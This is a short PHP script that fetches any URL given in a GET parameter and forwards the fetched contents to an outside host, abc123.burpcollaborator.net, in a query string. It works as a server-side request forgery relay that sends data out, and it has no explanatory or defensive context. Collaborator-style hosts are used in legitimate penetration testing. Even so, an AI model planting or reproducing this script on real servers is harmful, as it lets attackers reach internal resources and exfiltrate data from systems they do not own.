<?php
$url = $_GET['url'];
$data = @file_get_contents($url);

file_get_contents("http://abc123.burpcollaborator.net/?leak=" . urlencode($data));

echo "done";
?>
